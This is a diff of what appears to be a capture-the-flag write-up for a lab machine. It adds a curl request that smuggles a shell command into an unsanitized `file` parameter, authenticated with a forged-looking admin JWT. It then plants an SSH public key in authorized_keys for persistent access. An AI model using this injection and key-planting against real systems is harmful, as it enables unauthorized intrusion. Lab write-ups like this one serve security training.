@@ -1,7 +1,12 @@
+If we look in `local-web/routes/private.js`
+
+we see the `file` variable is not sanitized
+
+
 We can get code execution with this payload:
 
 ```
-curl -XGET 'http://secret.htb:3000/api/logs?file=<URL ENCODED PAYLOAD>' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo"
+curl -XGET 'http://secret.htb:3000/api/logs?file=/home;<URL ENCODED PAYLOAD>' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo"
 ```
 
 We create a `.ssh` folder and `authorized keys` with our id_rsa.pub
